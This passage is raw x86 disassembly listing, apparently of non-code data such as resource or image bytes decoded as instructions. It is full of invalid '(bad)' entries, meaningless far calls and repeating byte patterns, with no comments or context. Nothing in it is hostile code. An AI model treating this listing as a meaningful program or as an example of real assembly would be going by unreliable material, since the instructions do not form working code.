  412fa9:	add    BYTE PTR [eax],al
  412fab:	and    DWORD PTR [eax],eax
  412fad:	add    BYTE PTR [eax],al
  412faf:	sbb    BYTE PTR [eax],al
  412fb1:	add    BYTE PTR [eax],al
  412fb3:	sldt   WORD PTR [eax]
  412fb6:	add    BYTE PTR [eax],cl
	...
  412fc0:	sub    ch,BYTE PTR [edx]
  412fc2:	sub    DWORD PTR [ecx],ebp
  412fc4:	outs   dx,DWORD PTR ds:[esi]
  412fc5:	ins    DWORD PTR es:[edi],dx
  412fc6:	outs   dx,DWORD PTR ds:[esi]
  412fc7:	loop   0x412f5c
  412fc9:	nop
  412fca:	xchg   ecx,eax
  412fcb:	call   FWORD PTR [eax+0x59]
  412fce:	pop    ecx
  412fcf:	lds    ecx,FWORD PTR ds:0x4a0e0e
  412fd5:	add    BYTE PTR [eax],al
  412fd7:	sbb    al,BYTE PTR [eax]
  412fd9:	add    BYTE PTR [eax],al
  412fdb:	and    eax,0x27000000
  412fe0:	add    BYTE PTR [eax],al
  412fe2:	add    BYTE PTR [eax],bh
  412fe4:	add    al,BYTE PTR [edx]
  412fe6:	add    DWORD PTR [edx],edi
  412fe8:	add    BYTE PTR [eax],al
  412fea:	add    BYTE PTR [eax],cl
	...
  412ffc:	mov    eax,0x9e18b8b8
  413001:	sahf   
  413002:	sahf   
  413003:	(bad)  
  413004:	retf   0xcaca
  413007:	inc    esp
  413009:	(bad)  
  41300a:	(bad)  
  41300b:	(bad)  
  41300c:	mov    eax,0xbaffb8b8
  413011:	mov    edx,0xbebeffba
  413016:	mov    esi,0xc0c0c0ff
  41301b:	inc    ecx
  41301d:	rol    ecx,0xff
  413020:	rol    ecx,0xc1
  413023:	inc    eax
  413025:	rol    al,0xff
  413028:	mov    eax,0xafffb8b8
  41302d:	scas   eax,DWORD PTR es:[edi]
  41302e:	scas   eax,DWORD PTR es:[edi]
  41302f:	jmp    DWORD PTR [ebx-0x67005c5d]
  413035:	cwde   
  413036:	cwde   
  413037:	inc    DWORD PTR [ebx+0x6dff8383]
  41303d:	ins    DWORD PTR es:[edi],dx
  41303e:	ins    DWORD PTR es:[edi],dx
  41303f:	jmp    FWORD PTR [ecx+0x69]
  413042:	imul   edi,edi,0xff81817f
  413048:	xchg   ebx,eax
  413049:	xchg   edx,eax
  41304a:	xchg   edx,eax
  41304b:	jmp    DWORD PTR [ebx-0x55005c5d]
  413051:	lods   al,BYTE PTR ds:[esi]
  413052:	lods   al,BYTE PTR ds:[esi]
  413053:	cld    
  413054:	pop    esp
  413055:	pop    esp
  413056:	pop    esp
  413057:	xchg   edx,eax
  413058:	dec    esi
  413059:	dec    esi
  41305a:	dec    edi
  41305b:	js     0x4130c7
  41305d:	push   0x6b
  41305f:	xchg   esi,eax
  413060:	add    DWORD PTR [ebx+0x2f2f8084],0x2f
  413067:	sub    DWORD PTR [eax],eax
  413069:	add    BYTE PTR [eax],al
  41306b:	push   ss
  41306c:	add    BYTE PTR [eax],al
  41306e:	add    BYTE PTR [ecx],dl
  413070:	add    BYTE PTR [eax],al
  413072:	add    BYTE PTR [ecx],cl
  413074:	add    BYTE PTR [eax],al
  413076:	add    BYTE PTR [eax+eax*1],al
  413079:	add    BYTE PTR [eax],al
  41307b:	add    BYTE PTR [ebp+0x64],ah
  41307e:	xor    ebx,DWORD PTR gs:[edi+0x5f]
  413082:	pop    esi
  413083:	jmp    0x413037
  413085:	mov    al,0xb0
  413087:	call   FWORD PTR [esi-0x1c006666]
  41308d:	loope  0x413070
  41308f:	(bad)  
  413090:	fcomp  st(0)
  413092:	fcos   
  413094:	inc    esi
  413095:	inc    esi
  413096:	inc    esi
  413097:	rol    DWORD PTR ds:0xe9a0505,cl
  41309d:	push   cs
  41309e:	push   cs
  41309f:	mov    ebx,0xff636363
  4130a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130a6:	mov    ds:0x4a4c4bff,eax
  4130ab:	mov    ebp,0x55080b0a
  4130b0:	add    BYTE PTR [eax],al
  4130b2:	add    BYTE PTR [ecx],dl
	...
  4130c0:	pop    edx
  4130c1:	pop    edx
  4130c2:	pop    edx
  4130c3:	(bad)  
  4130c5:	push   eax
  4130c6:	push   eax
  4130c7:	and    BYTE PTR [esi-0x380d595a],0xc7
  4130ce:	(bad)  
  4130cf:	(bad)  
  4130d0:	mov    ecx,0xadffb9b9
  4130d5:	lods   eax,DWORD PTR ds:[esi]
  4130d6:	lods   eax,DWORD PTR ds:[esi]
  4130d7:	jmp    DWORD PTR [ebp-0x5b005a5b]
  4130dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130df:	jmp    DWORD PTR [esp+eiz*4-0x6868005c]
  4130e6:	xchg   edi,eax
  4130e7:	dec    DWORD PTR [ecx+0x7dff8989]
  4130ed:	jge    0x41316a
  4130ef:	push   DWORD PTR [ecx+0x71]
  4130f2:	jno    0x4130f3
  4130f4:	gs gs call FWORD PTR gs:[ebp+0x5e]
  4130fa:	pop    esi
  4130fb:	jmp    FWORD PTR [ecx+0x69]
  4130fe:	push   0xffffffff
  413100:	add    BYTE PTR [edx-0x6565007d],0x9b
  413107:	jmp    FWORD PTR [ebp-0x49005155]
  41310d:	mov    dh,0xb5
  41310f:	(bad)  
  413110:	mov    ecx,0xb8f8b7b7
  413115:	mov    dh,0xb6
  413117:	out    dx,al
  413118:	(bad)  
  41311a:	(bad)  
  41311c:	fcmovnu st,st(3)
  41311e:	(bad)  
  413120:	lahf   
  413121:	lahf   
  413122:	lahf   
  413123:	clc    
  413124:	jg     0x4131a5
  413126:	jle    0x413154
  413128:	add    BYTE PTR [eax],al
  41312a:	add    BYTE PTR [ebx],al
  41312c:	add    BYTE PTR [eax],al
  41312e:	add    BYTE PTR ds:0x3000000,al
  413134:	add    BYTE PTR [eax],al
  413136:	add    BYTE PTR [ecx],al
  413138:	add    BYTE PTR [eax],al
  41313a:	add    BYTE PTR [eax],al
  41313c:	cdq    
  41313d:	cwde   
  41313e:	fwait
  41313f:	mov    dh,BYTE PTR [eax-0x57005354]
  413145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413146:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413147:	call   DWORD PTR [esi-0x54006e6f]
  41314d:	stos   BYTE PTR es:[edi],al
  41314e:	stos   DWORD PTR es:[edi],eax
  41314f:	dec    edi
  413151:	iret   
  413152:	sar    bh,1
  413154:	ret    0xc2c2
  413157:	call   FWORD PTR [eax-0x74006768]
  41315d:	mov    ecx,DWORD PTR [ebx+0x5e5e5eff]
  413163:	loop   0x4131d2
  413165:	ins    DWORD PTR es:[edi],dx
  413166:	ins    DWORD PTR es:[edi],dx
  413167:	mov    bl,0xd1
  413169:	rcl    ecx,1
  41316b:	stc    
  41316c:	(bad)
  41316f:	call   DWORD PTR [ebp+0x55]
  413172:	push   esp
  413173:	leave  
  413174:	adc    dl,BYTE PTR [edx]
  413176:	adc    BYTE PTR [edi+0x0],bl
  413179:	add    BYTE PTR [eax],al
  41317b:	adc    eax,DWORD PTR [eax]
	...
  413185:	add    BYTE PTR [eax],al
  413187:	add    BYTE PTR [ebx+0x43],al
  41318a:	inc    ebx
  41318b:	cs dec esi
  41318d:	dec    esi
  41318e:	dec    ebp
  41318f:	cdq    
  413190:	lea    ecx,[ebp-0x5e5e1972]
  413196:	mov    eax,ds:0xa5a6a6ff
  41319b:	call   FWORD PTR [edi-0x7a006161]
  4131a1:	test   DWORD PTR [ebp+0x777878ff],eax
  4131a7:	(bad)  
  4131a8:	jp     0x413224
  4131aa:	jns    0x4131ab
  4131ac:	jp     0x413229
  4131ae:	jl     0x4131af
  4131b0:	jg     0x413231
  4131b2:	cmp    edi,0xff8a8988
  4131b8:	popf   
  4131b9:	popf   
  4131ba:	lahf   
  4131bb:	jmp    FWORD PTR [ebx-0x50005255]
  4131c1:	scas   al,BYTE PTR es:[edi]
  4131c2:	scas   al,BYTE PTR es:[edi]
  4131c3:	push   DWORD PTR [ecx-0x49004f51]
  4131c9:	mov    bh,0xb7
  4131cb:	push   DWORD PTR [ebx-0x46004b4c]
  4131d1:	ret    
  4131d2:	vshufps ymm2,ymm0,ymm3,0xd4
  4131d7:	inc    edx
  4131d9:	ret    
  4131da:	(bad)  
  4131dd:	mov    esi,0xa7a7febe
  4131e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e3:	push   DWORD PTR [eax+0x70]
  4131e6:	jo     0x413231
	...
  4131fc:	nop
  4131fd:	(bad)  
  4131fe:	xchg   ecx,eax
  4131ff:	sub    DWORD PTR [edx-0x50005859],0xffffffaa
  413206:	stos   BYTE PTR es:[edi],al
  413207:	call   FWORD PTR [edi-0x4d006364]
  41320d:	mov    al,0xb2
  41320f:	dec    eax
  413211:	enter  0xffcc,0xab
  413215:	lods   al,BYTE PTR ds:[esi]
  413216:	lods   al,BYTE PTR ds:[esi]
  413217:	jmp    FWORD PTR [ebp-0x47005354]
  41321d:	mov    eax,0x8484ffb8
  413222:	test   cl,dh
  413224:	cs cs cs mov ch,0x19
  413229:	sbb    DWORD PTR [ecx],ebx
  41322b:	(bad)  
  41322c:	jno    0x4132a0
  41322e:	jae    0x4131e7
  413230:	rcl    dl,cl
  413232:	shl    ah,cl
  413234:	mov    bh,0xb7
  413236:	mov    bh,0xff
  413238:	push   esi
  413239:	push   esi
  41323a:	push   ebx
  41323b:	mov    esi,0x6b181818
  413240:	add    BYTE PTR [eax],al
  413242:	add    BYTE PTR [edi],ah
  413244:	add    BYTE PTR [eax],al
  413246:	add    BYTE PTR [esi],al
	...
  413250:	pop    ds
  413251:	and    BYTE PTR [eax],ah
  413253:	or     BYTE PTR [ecx],bh
  413255:	cmp    DWORD PTR [edx],edi
  413257:	xor    al,0x79
  413259:	jns    0x4132d6
  41325b:	(bad)  
  41325c:	xchg   esp,eax
  41325d:	xchg   ebp,eax
  41325e:	xchg   ebp,eax
  41325f:	cli    
  413260:	test   DWORD PTR [ebp-0x75740077],eax
  413266:	(bad)  
  413267:	dec    DWORD PTR [esi-0x6e006d72]
  41326d:	nop
  41326e:	xchg   ebp,eax
  41326f:	call   DWORD PTR [edi-0x5e006569]
  413275:	mov    eax,ds:0xaaaaffa4
  41327a:	lods   al,BYTE PTR ds:[esi]
  41327b:	jmp    FWORD PTR [eax-0x50004f53]
  413281:	mov    ecx,0xc8b7ffbc
  413286:	retf   
  413287:	dec    eax
  413289:	fcomp  st(3)
  41328b:	call   ecx
  41328d:	fsubrp st(1),st
  41328f:	(bad)  
  413290:	(bad)  
  413292:	(bad)  
  413293:	(bad)  
  413294:	(bad)  
  413296:	leave  
  413297:	dec    ebx
  413299:	retf   0xfec8
  41329c:	rol    ebp,0xc5
  41329f:	cld    
  4132a0:	stos   BYTE PTR es:[edi],al
  4132a1:	test   al,0xa8
  4132a3:	inc    DWORD PTR [esi+0x6d8686]
	...
  4132b9:	add    BYTE PTR [eax],al
  4132bb:	add    BYTE PTR [ecx-0x517c6d70],dl
  4132c1:	stos   BYTE PTR es:[edi],al
  4132c2:	stos   DWORD PTR es:[edi],eax
  4132c3:	push   DWORD PTR [ebp-0x58004e50]
  4132c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132cb:	push   DWORD PTR [esi-0x3f00494c]
  4132d1:	mov    edi,0xb8b8ffc0
  4132d6:	mov    eax,0xbababaff
  4132db:	jmp    FWORD PTR [edi-0x32005051]
  4132e1:	int    0xcd
  4132e3:	(bad)  
  4132e4:	jmp    0xa9411cd2
  4132e9:	test   al,0xa8
  4132eb:	cli    
  4132ec:	cmp    DWORD PTR [eax],edi
  4132ee:	cmp    BYTE PTR [ebx-0x69e1e3e4],dh
  4132f4:	add    DWORD PTR [ebx-0x90a257c],0xfffffff5
  4132fb:	jmp    DWORD PTR [ebx+0x19ffa2a2]
  413301:	pop    ss
  413302:	pop    ss
  413303:	test   DWORD PTR [edi],edx
  413305:	pop    ss
  413306:	sbb    BYTE PTR [esi],ah
  413308:	dec    eax
  413309:	dec    eax
  41330a:	dec    edx
  41330b:	inc    eax
  41330c:	jae    0x413381
  41330e:	ja     0x413384
  413310:	add    DWORD PTR [ecx-0x77775a7a],0xffffff8c
  413317:	int3   
  413318:	mov    cl,BYTE PTR [ecx-0x75751373]
  41331e:	mov    ?,edi
  413320:	mov    WORD PTR [edx+edx*4-0x6b707401],cs
  413327:	dec    DWORD PTR [ebx-0x7300696f]
  41332d:	xchg   esi,eax
  41332e:	pushf  
  41332f:	call   FWORD PTR [edx-0x4e005258]
  413335:	mov    edi,0xd1c7ffc3
  41333a:	aam    0xff
  41333c:	rcl    ecx,1
  41333e:	sar    bh,cl
  413340:	rol    ecx,cl
  413342:	mov    esi,0xa4acdbff
  413347:	call   ebp
  413349:	jg     0x4133bd
  41334b:	dec    edx
  41334d:	dec    eax
  41334e:	xor    al,0xff
  413350:	rcl    BYTE PTR ds:0x19b4ff06,0x13
  413357:	(bad)  
  413358:	mov    esp,0xc9ffa4a9
  41335d:	(bad)  
  41335f:	cld    
  413360:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413363:	call   FWORD PTR [edi+0x8d9f9f]
	...
  413379:	add    BYTE PTR [eax],al
  41337b:	add    BYTE PTR [edx-0x497c6c70],dl
  413381:	mov    cl,0xb2
  413383:	(bad)  
  413384:	mov    ebp,0xb0ffb9b8
  413389:	stos   BYTE PTR es:[edi],al
  41338a:	lods   eax,DWORD PTR ds:[esi]
  41338b:	(bad)  
  41338c:	mov    esi,0xbbffbdbc
  413391:	mov    ebx,0x8e8effbb
  413396:	mov    ?,edi
  413398:	call   0xb5b5:0xb5ff9a9a
  41339f:	push   DWORD PTR [ebp-0x3f004a4b]
  4133a5:	rol    al,0xff
  4133a8:	jmp    0x413395
  4133aa:	jmp    0x4133ab
  4133ac:	cmc    
  4133ad:	cmc    
  4133ae:	cmc    
  4133af:	call   DWORD PTR [eax+0x55f69090]
  4133b5:	push   ebp
  4133b6:	push   esi
  4133b7:	in     eax,dx
  4133b8:	pusha  
  4133b9:	popa   
  4133ba:	(bad)  
  4133bb:	hlt    
  4133bc:	jno    0x41342e
  4133be:	jae    0x413395
  4133c0:	mov    DWORD PTR [edi-0x60602775],eax
  4133c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133c7:	cmc    
  4133c8:	lahf   
  4133c9:	lahf   
  4133ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133cb:	call   FWORD PTR [edx-0x6d005e63]
  4133d1:	xchg   edi,eax
  4133d2:	fwait
  4133d3:	call   DWORD PTR [eax-0x6e006269]
  4133d9:	popf   
  4133da:	mov    eax,ds:0xaca796ff
  4133df:	jmp    DWORD PTR [ebx-0x52004b50]
  4133e5:	scas   al,BYTE PTR es:[edi]
  4133e6:	scas   eax,DWORD PTR es:[edi]
  4133e7:	(bad)  
  4133e8:	mov    ecx,0xc6ffaba9
  4133ed:	mov    al,0xb0
  4133ef:	dec    eax
  4133f1:	mov    ds:0x87c8ff9e,eax
  4133f6:	jle    0x4133f7
  4133f8:	leave  
  4133f9:	bound  edx,QWORD PTR [ebx-0x1]
  4133fc:	mov    ebx,0xb4ff162a
  413401:	or     eax,DWORD PTR [eax]
  413403:	jmp    FWORD PTR [ebx-0x5b00fff8]
  413409:	or     DWORD PTR [eax],eax
  41340b:	jmp    DWORD PTR [edx-0x5c00ffee]
  413411:	push   cs
  413412:	add    bh,bh
  413414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413415:	adc    al,0x1
  413417:	(bad)  
  413418:	mov    ebp,0xcdff9b9e
  41341d:	fstp   st(7)
  41341f:	(bad)  
  413420:	stos   BYTE PTR es:[edi],al
  413421:	test   eax,0x9999ffa9
  413426:	cdq    
  413427:	mov    cl,0x0
	...
  413439:	add    BYTE PTR [eax],al
  41343b:	add    BYTE PTR [ecx-0x417c6c6e],dl
  413441:	mov    bh,0xb7
  413443:	inc    ecx
  413445:	mov    edx,0xaaaeffbd
  41344a:	lods   al,BYTE PTR ds:[esi]
  41344b:	(bad)  
  41344c:	mov    esp,0xbcffbbba
  413451:	mov    esp,0x9f9fffbf
  413456:	lahf   
  413457:	call   FWORD PTR [eax-0x6f006768]
  41345d:	nop
  41345e:	nop
  41345f:	call   FWORD PTR [eax-0x6b006668]
  413465:	xchg   ebx,eax
  413466:	xchg   ebp,eax
  413467:	call   DWORD PTR [ecx-0x67006c6f]
  41346d:	call   0xff9b:0x9698ff9a
  413474:	pushf  
  413475:	fwait
  413476:	mov    eax,ds:0xaaa6a4ff
  41347b:	jmp    DWORD PTR [ecx+ebp*4-0x50590053]
  413482:	mov    dl,0xff
  413484:	test   al,0xb2
  413486:	mov    bh,0xff
  413488:	test   eax,0xaeffbcb6
  41348d:	mov    ebp,0xb8afffc2
  413492:	mov    edx,0xa8a7b3ff
  413497:	inc    ecx
  413499:	mov    ds:0x90c4ffa0,al
  41349e:	mov    ?,edi
  4134a0:	mov    ebx,0xb4ff6a6f
  4134a5:	inc    esi
  4134a6:	cmp    al,0xff
  4134a8:	test   eax,0xa1ff1625
  4134ad:	or     al,BYTE PTR [eax]
  4134af:	jmp    DWORD PTR [ecx-0x5e00fffa]
  4134b5:	push   es
  4134b6:	add    bh,bh
  4134b8:	mov    ds:0xa6ff000e,al
  4134bd:	sbb    ecx,DWORD PTR [edx]
  4134bf:	jmp    FWORD PTR [eax-0x5300eddf]
  4134c5:	and    eax,0x28b1ff13
  4134ca:	adc    al,0xff
  4134cc:	mov    dl,0x29
  4134ce:	adc    eax,0x1024b3ff
  4134d3:	push   DWORD PTR [ebp-0x3e00f6e3]
  4134d9:	xchg   edi,eax
  4134da:	xchg   ecx,eax
  4134db:	dec    edi
  4134dd:	(bad)  
  4134df:	(bad)  
  4134e0:	mov    cl,0xae
  4134e2:	scas   al,BYTE PTR es:[edi]
  4134e3:	call   FWORD PTR [edx+0xcc9b9b]
	...
  4134f9:	add    BYTE PTR [eax],al
  4134fb:	add    BYTE PTR [ebx-0x3b7a6b6f],dl
  413501:	mov    esi,0xbec6ffbf
  413506:	sar    edi,0xb0
  413509:	lods   al,BYTE PTR ds:[esi]
  41350a:	stos   DWORD PTR es:[edi],eax
  41350b:	(bad)  
  41350c:	mov    ebp,0xbbffbbba
  413511:	mov    ebx,0x9d9dffbc
  413516:	popf   
  413517:	call   FWORD PTR [ebp-0x62006263]
  41351d:	popf   
  41351e:	lahf   
  41351f:	dec    DWORD PTR [esi-0x6d006d72]
  413525:	(bad)  
  413526:	xchg   ebp,eax
  413527:	dec    DWORD PTR [edx+0x7aff9392]
  41352d:	mov    ds:0x9f92ff91,eax
  413532:	mov    ds:0xb4afa2ff,eax
  413537:	push   DWORD PTR [ebx-0x3f00373d]
  41353d:	into   
  41353e:	iret   
  41353f:	inc    ecx
  413541:	ret    0xffc1
  413544:	mov    ecx,0xbaffa0a2
  413549:	xchg   DWORD PTR [eax+0x6b6db3ff],eax
  41354f:	jmp    DWORD PTR [edi-0x6100b5b4]
  413555:	sub    al,0x24
  413557:	call   FWORD PTR [eax-0x7400fff2]
  41355d:	add    BYTE PTR [eax],al
  41355f:	dec    DWORD PTR [ebx-0x70010000]
  413565:	add    BYTE PTR [eax],al
  413567:	call   DWORD PTR [ebx-0x6000fffb]
  41356d:	sbb    ecx,DWORD PTR [edx]
  41356f:	jmp    FWORD PTR [ebx-0x5100e3d5]
  413575:	sub    al,0x1c
  413577:	push   DWORD PTR [ecx-0x4c00e3d2]
  41357d:	xor    BYTE PTR [ebx],bl
  41357f:	push   DWORD PTR [ebp-0x4700e3d1]
  413585:	xor    BYTE PTR ds:0x1f31baff,bl
  41358b:	(bad)  
  41358c:	mov    esp,0xbdff1f33
  413591:	xor    bl,BYTE PTR [edi]
  413593:	(bad)  
  413594:	mov    ebp,0xc3ff0c22
  413599:	mov    BYTE PTR [edi-0x1],bh
  41359c:	into   
  41359d:	fsubrp st(1),st
  41359f:	push   DWORD PTR [ebp-0x65004b4b]
  4135a5:	cdq    
  4135a6:	cdq    
  4135a7:	fld    QWORD PTR [eax]
	...
  4135b9:	add    BYTE PTR [eax],al
  4135bb:	add    BYTE PTR [ecx-0x35796a6e],dl
  4135c1:	ret    
  4135c2:	ret    
  4135c3:	dec    edx
  4135c5:	(bad)  
  4135c6:	(bad)  
  4135c7:	push   DWORD PTR [ecx-0x42005354]
  4135cd:	mov    edx,0xbbbbffbb
  4135d2:	mov    esp,0x9d9d9dff
  4135d7:	call   FWORD PTR [edi-0x4d006061]
  4135dd:	mov    dl,0xb3
  4135df:	call   DWORD PTR [esi-0x6a006569]
  4135e5:	cdq    
  4135e6:	popf   
  4135e7:	jmp    FWORD PTR [ebp+edi*4-0x3c4b0043]
  4135ee:	mov    edi,0xacabb5ff
  4135f3:	jmp    FWORD PTR [ebp-0x57007c7a]
  4135f9:	pusha  
  4135fa:	pop    ebp
  4135fb:	jmp    DWORD PTR [edx-0x6900bab9]
  413601:	sub    eax,0x138dff2c
  413606:	push   cs
  413607:	inc    DWORD PTR [eax+eax*1+0x7aff00]
  41360e:	add    bh,bh
  413610:	jl     0x413612
  413612:	add    bh,bh
  413614:	test   DWORD PTR [eax],eax
  413616:	add    bh,bh
  413618:	mov    al,BYTE PTR ds:0xf92ff00
  41361e:	add    bh,bh
  413620:	xchg   edi,eax
  413621:	adc    BYTE PTR [eax],al
  413623:	call   FWORD PTR [ecx+edx*1+0x12a2ff00]
  41362a:	add    bh,bh
  41362c:	scas   al,BYTE PTR es:[edi]
  41362d:	sub    BYTE PTR [esi],dl
  41362f:	push   DWORD PTR [esi-0x4900d9c9]
  413635:	ss and eax,0x2638b8ff
  41363b:	(bad)  
  41363c:	mov    ebx,0xbfff2737
  413641:	cmp    esp,DWORD PTR [edi]
  413643:	inc    edx
  413645:	cmp    al,0x29
  413647:	inc    esp
  413649:	ds sub bh,bh
  41364c:	(bad)  
  41364d:	aas    
  41364e:	sub    edi,edi
  413650:	mov    DWORD PTR [edx+0x2c],0x142ec7ff
  413657:	inc    edi
  413659:	js     0x4136c8
  41365b:	dec    edi
  41365d:	fstp   st(7)
  41365f:	(bad)  
  413660:	mov    ecx,0x9affbbbb
  413665:	cdq    
  413666:	cdq    
  413667:	jmp    0x0:0x0
	...
  41367a:	add    BYTE PTR [eax],al
  41367c:	xchg   edx,eax
  41367d:	xchg   ecx,eax
  41367e:	xchg   ebp,eax
  41367f:	xchg   ah,cl
  413681:	mov    edi,0xc6c6ccff
  413687:	push   DWORD PTR [ebx-0x44005152]
  41368d:	mov    ebx,0xbcbcffbd
  413692:	mov    ebp,0xa1a0a0ff
  413697:	jmp    DWORD PTR [ecx-0x4c005e5f]
  41369d:	mov    bl,0xb3
  41369f:	jmp    DWORD PTR [eax+ebp*4-0x705d0054]
  4136a6:	mov    ?,edi
  4136a8:	xchg   esi,eax
  4136a9:	cmp    DWORD PTR [eax],edi
  4136ab:	call   DWORD PTR [esi-0x7100d7db]
  4136b1:	sbb    dl,BYTE PTR [edi+edi*8]
  4136b4:	mov    BYTE PTR [ebx],cl
  4136b6:	add    bh,bh
  4136b8:	add    BYTE PTR [eax],0x0
  4136bb:	(bad)  
  4136bc:	jl     0x4136be
  4136be:	add    bh,bh
  4136c0:	jge    0x4136c2
  4136c2:	add    bh,bh
  4136c4:	jg     0x4136c6
  4136c6:	add    bh,bh
  4136c8:	add    DWORD PTR [edi],0xd87ff00
  4136ce:	add    bh,bh
  4136d0:	mov    cs,WORD PTR [edi]
  4136d2:	add    bh,bh
  4136d4:	nop
  4136d5:	(bad)  
  4136d7:	call   DWORD PTR [ebx+0x7eff010f]
  4136dd:	and    bl,BYTE PTR [eax]
  4136df:	(bad)  
  4136e0:	jp     0x4136fa
  4136e2:	or     eax,0x119fff
  4136e7:	jmp    FWORD PTR [eax-0x4b00feec]
  4136ed:	xor    DWORD PTR [edi],ebx
  4136ef:	(bad)  
  4136f0:	mov    esp,0xbfff3242
  4136f5:	inc    edx
  4136f6:	xor    edi,edi
  4136f8:	ret    
  4136f9:	inc    esp
  4136fa:	xor    edi,edi
  4136fc:	mov    BYTE PTR [esi+0x32],0xff
  413700:	enter  0x3448,0xff
  413704:	retf   
  413705:	dec    ecx
  413706:	xor    eax,0x364bcdff
  41370b:	dec    edi
  41370d:	dec    esp
  41370e:	aaa    
  41370f:	call   eax
  413711:	dec    edi
  413712:	cmp    bh,bh
  413714:	sar    DWORD PTR [ebx],1
  413716:	and    bh,bh
  413718:	retf   0x5e6c
  41371b:	dec    ebp
  41371d:	xlat   BYTE PTR ds:[ebx]
  41371e:	fdivr  st,st(7)
  413720:	(bad)  
  413721:	enter  0xffc8,0x9b
  413725:	call   0x0:0xf09a
	...
  41373c:	xchg   ebx,eax
  41373d:	nop
  41373e:	xchg   esp,eax
  41373f:	xchg   al,dl
  413741:	leave  
  413742:	enter  0xcfff,0xc9
  413746:	retf   0xb3ff
  413749:	mov    al,0xb1
  41374b:	(bad)  
  41374c:	mov    ebx,0xbfffbbb9
  413751:	mov    edi,0xa6a6ffbf
  413756:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413757:	jmp    DWORD PTR [ebp-0x50005a5b]
  41375d:	scas   eax,DWORD PTR es:[edi]
  41375e:	scas   eax,DWORD PTR es:[edi]
  41375f:	push   DWORD PTR [edx-0x62004448]
  413765:	mov    DWORD PTR [edx+0x7cff],ecx
  41376b:	inc    DWORD PTR [edx-0x7600ffff]
  413771:	push   cs
  413772:	push   es
  413773:	dec    DWORD PTR [ecx-0x7700f8ef]
  413779:	adc    cl,BYTE PTR [eax]
  41377b:	inc    DWORD PTR [edi-0x7900f8ef]
  413781:	(bad)  
  413783:	inc    DWORD PTR [ebp-0x7800fef5]
  413789:	or     al,0x0
  41378b:	dec    DWORD PTR [ebp-0x6d00fff3]
  413791:	push   cs
  413792:	add    bh,bh
  413794:	xchg   esp,eax
  413795:	(bad)  
  413797:	(bad)  
  413798:	jg     0x4137ca
  41379a:	daa    
  41379b:	jmp    FWORD PTR [eax-0x5b00595a]
  4137a1:	mov    al,ds:0x1983ff9f
  4137a6:	or     eax,0x518acff
  4137ab:	(bad)  
  4137ac:	mov    edi,0xc6ff3041
  4137b1:	push   edx
  4137b2:	inc    ecx
  4137b3:	dec    ecx
  4137b5:	push   ecx
  4137b6:	inc    eax
  4137b7:	dec    ebp
  4137b9:	push   ebx
  4137ba:	aas    
  4137bb:	call   eax
  4137bd:	push   ebp
  4137be:	inc    eax
  4137bf:	call   edx
  4137c1:	push   edi
  4137c2:	inc    ebx
  4137c3:	call   esp
  4137c5:	pop    eax
  4137c6:	inc    esp
  4137c7:	call   esi
  4137c9:	pop    edx
  4137ca:	inc    ebp
  4137cb:	(bad)  
  4137cc:	fcomp  DWORD PTR [ebx+0x46]
  4137cf:	(bad)  
  4137d0:	fstp   DWORD PTR [esi+0x49]
  4137d3:	(bad)  
  4137d4:	fmul   QWORD PTR [esi+0x35]
  4137d7:	call   ebx
  4137d9:	arpl   WORD PTR [eax-0x1],dx
  4137dc:	int    0xcd
  4137de:	int3   
  4137df:	dec    esp
  4137e1:	rcl    ebx,cl
  4137e3:	call   FWORD PTR [esp+ebx*4-0x67680b64]
  4137ea:	cwde   
  4137eb:	adc    eax,DWORD PTR [eax]
	...
  4137f9:	add    BYTE PTR [eax],al
  4137fb:	add    BYTE PTR [ebx-0x2f796c70],dl
  413801:	leave  
  413802:	retf   0xceff
  413805:	enter  0xffc9,0xb3
  413809:	scas   eax,DWORD PTR es:[edi]
  41380a:	mov    al,0xff
  41380c:	mov    ebx,0xbfffbab9
  413811:	mov    edi,0xa9a9ffc1
  413816:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413817:	jmp    FWORD PTR [ecx-0x53005657]
  41381d:	lods   al,BYTE PTR ds:[esi]
  41381e:	lods   al,BYTE PTR ds:[esi]
  41381f:	(bad)  
  413820:	mov    edx,0xa4ffbdbc
  413825:	mov    ds:0xe82ffa5,al
  41382a:	add    eax,0x121b90ff
  41382f:	call   DWORD PTR [edx-0x7100e2db]
  413835:	push   ds
  413836:	adc    eax,0x121b8cff
  41383b:	dec    DWORD PTR [ebx-0x7600f1e9]
  413841:	adc    al,0xc
  413843:	dec    DWORD PTR [ecx-0x7200f9ee]
  413849:	or     eax,0xd91ff00
  41384e:	add    bh,bh
  413850:	xchg   ebp,eax
  413851:	(bad)  
  413853:	(bad)  
  413854:	jnp    0x41387b
  413856:	sbb    al,0xff
  413858:	mov    bl,0xaa
  41385a:	test   eax,0xb6b6b6ff
  41385f:	(bad)  
  413860:	mov    esi,0x89ffbebe
  413865:	fs popa 
  413867:	jmp    DWORD PTR [ebx-0x3700f5e3]
  41386d:	push   eax
  41386e:	ds dec esi
  413871:	pusha  
  413872:	dec    esi
  413873:	call   ecx
  413875:	pop    esi
  413876:	dec    esp
  413877:	call   ebp
  413879:	pusha  
  41387a:	dec    ebp
  41387b:	call   edi
  41387d:	bound  ecx,QWORD PTR [esi-0x1]
  413880:	fldenv [eax+edx*2-0x1]
  413884:	(bad)  [ebp+0x50]
  413887:	(bad)  
  413888:	fisub  WORD PTR [esi+0x51]
  41388b:	(bad)  
  41388c:	fbld   TBYTE PTR [edi+0x52]
  41388f:	jmp    ecx
  413891:	ins    BYTE PTR es:[edi],dx
  413892:	push   edi
